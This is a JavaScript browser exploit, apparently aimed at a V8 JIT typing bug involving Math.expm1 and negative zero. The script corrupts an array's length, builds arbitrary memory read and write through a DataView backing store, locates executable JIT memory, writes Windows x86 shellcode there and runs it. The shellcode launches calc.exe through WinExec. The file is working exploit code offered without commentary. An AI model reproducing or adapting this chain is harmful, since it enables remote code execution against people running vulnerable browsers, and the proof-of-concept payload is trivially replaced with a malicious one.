function pwn() {
    var f64Arr = new Float64Array(1);
    var u32Arr = new Uint32Array(f64Arr.buffer);

    function f2u(f) {
        f64Arr[0] = f;
        return u32Arr;
    }

    function u2f(h, l)
    {
        u32Arr[0] = l;
        u32Arr[1] = h;
        return f64Arr[0];
    }

    function hex(i) {
        return "0x" + i.toString(16).padStart(8, "0");
    }

    function log(str) {
        console.log(str);
        document.body.innerText += str + '\n';
    }

    var big_arr = [1.1, 1.2];
    var ab = new ArrayBuffer(0x233);
    var data_view = new DataView(ab);

    function opt_me(x) {
        var oob_arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
        big_arr = [1.1, 1.2];
        ab = new ArrayBuffer(0x233);
        data_view = new DataView(ab);

        let obj = {
            a: -0
        };
        let idx = Object.is(Math.expm1(x), obj.a) * 10;

        var tmp = f2u(oob_arr[idx])[0];
        oob_arr[idx] = u2f(0x234, tmp);
    }
    for (let a = 0; a < 0x1000; a++)
        opt_me(0);

    opt_me(-0);
    var optObj = {
        flag: 0x266,
        funcAddr: opt_me
    };

    //log("[+] big_arr.length: " + big_arr.length);

    if (big_arr.length != 282) {
        //log("[-] Can not modify big_arr length !");
        return;
    }
    var backing_store_idx = -1;
    var backing_store_in_hign_mem = false;
    var OptObj_idx = -1;
    var OptObj_idx_in_hign_mem = false;

    for (let a = 0; a < 0x100; a++) {
        if (backing_store_idx == -1) {
            if (f2u(big_arr[a])[0] == 0x466) {
                backing_store_in_hign_mem = true;
                backing_store_idx = a;
            } else if (f2u(big_arr[a])[1] == 0x466) {
                backing_store_in_hign_mem = false;
                backing_store_idx = a + 1;
            }
        }

        else if (OptObj_idx == -1) {
            if (f2u(big_arr[a])[0] == 0x4cc) {
                OptObj_idx_in_hign_mem = true;
                OptObj_idx = a;
            } else if (f2u(big_arr[a])[1] == 0x4cc) {
                OptObj_idx_in_hign_mem = false;
                OptObj_idx = a + 1;
            }
        }

    }

    if (backing_store_idx == -1) {
        log("[-] Can not find backing store !");
        return;
    } else
        log("[+] backing store idx: " + backing_store_idx +
            ", in " + (backing_store_in_hign_mem ? "high" : "low") + " place.");

    if (OptObj_idx == -1) {
        log("[-] Can not find Opt Obj !");
        return;
    } else
        log("[+] OptObj idx: " + OptObj_idx +
            ", in " + (OptObj_idx_in_hign_mem ? "high" : "low") + " place.");

    var backing_store = (backing_store_in_hign_mem ?
        f2u(big_arr[backing_store_idx])[1] :
        f2u(big_arr[backing_store_idx])[0]);
    log("[+] Origin backing store: " + hex(backing_store));

    var dataNearBS = (!backing_store_in_hign_mem ?
        f2u(big_arr[backing_store_idx])[1] :
        f2u(big_arr[backing_store_idx])[0]);

    function read(addr) {
        if (backing_store_in_hign_mem)
            big_arr[backing_store_idx] = u2f(addr, dataNearBS);
        else
            big_arr[backing_store_idx] = u2f(dataNearBS, addr);
        return data_view.getInt32(0, true);
    }

    function write(addr, msg) {
        if (backing_store_in_hign_mem)
            big_arr[backing_store_idx] = u2f(addr, dataNearBS);
        else
            big_arr[backing_store_idx] = u2f(dataNearBS, addr);
        data_view.setInt32(0, msg, true);
    }

    var OptJSFuncAddr = (OptObj_idx_in_hign_mem ?
        f2u(big_arr[OptObj_idx])[1] :
        f2u(big_arr[OptObj_idx])[0]) - 1;
    log("[+] OptJSFuncAddr: " + hex(OptJSFuncAddr));

    var OptJSFuncCodeAddr = read(OptJSFuncAddr + 0x18) - 1;
    log("[+] OptJSFuncCodeAddr: " + hex(OptJSFuncCodeAddr));

    var RWX_Mem_Addr = OptJSFuncCodeAddr + 0x40;
    log("[+] RWX Mem Addr: " + hex(RWX_Mem_Addr));

    var shellcode = new Uint8Array(
           [0x89, 0xe5, 0x83, 0xec, 0x20, 0x31, 0xdb, 0x64, 0x8b, 0x5b, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b,
            0x1c, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b, 0x43, 0x08, 0x89, 0x45, 0xfc, 0x8b, 0x58, 0x3c, 0x01, 0xc3,
            0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x7b, 0x20, 0x01, 0xc7, 0x89, 0x7d, 0xf8, 0x8b, 0x4b, 0x24,
            0x01, 0xc1, 0x89, 0x4d, 0xf4, 0x8b, 0x53, 0x1c, 0x01, 0xc2, 0x89, 0x55, 0xf0, 0x8b, 0x53, 0x14,
            0x89, 0x55, 0xec, 0xeb, 0x32, 0x31, 0xc0, 0x8b, 0x55, 0xec, 0x8b, 0x7d, 0xf8, 0x8b, 0x75, 0x18,
            0x31, 0xc9, 0xfc, 0x8b, 0x3c, 0x87, 0x03, 0x7d, 0xfc, 0x66, 0x83, 0xc1, 0x08, 0xf3, 0xa6, 0x74,
            0x05, 0x40, 0x39, 0xd0, 0x72, 0xe4, 0x8b, 0x4d, 0xf4, 0x8b, 0x55, 0xf0, 0x66, 0x8b, 0x04, 0x41,
            0x8b, 0x04, 0x82, 0x03, 0x45, 0xfc, 0xc3, 0xba, 0x78, 0x78, 0x65, 0x63, 0xc1, 0xea, 0x08, 0x52,
            0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0x65, 0x18, 0xe8, 0xb8, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51,
            0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x41, 0x51, 0x53, 0xff,
            0xd0, 0x31, 0xc9, 0xb9, 0x01, 0x65, 0x73, 0x73, 0xc1, 0xe9, 0x08, 0x51, 0x68, 0x50, 0x72, 0x6f,
            0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0x65, 0x18, 0xe8, 0x87, 0xff, 0xff, 0xff, 0x31, 0xd2,
            0x52, 0xff, 0xd0, 0x90, 0x90, 0xfd, 0xff]
    );

    log("[+] writing shellcode ... ");
    for (let i = 0; i < shellcode.length; i++)
        write(RWX_Mem_Addr + i, shellcode[i]);

    log("[+] execute shellcode !");
    opt_me();
}
pwn();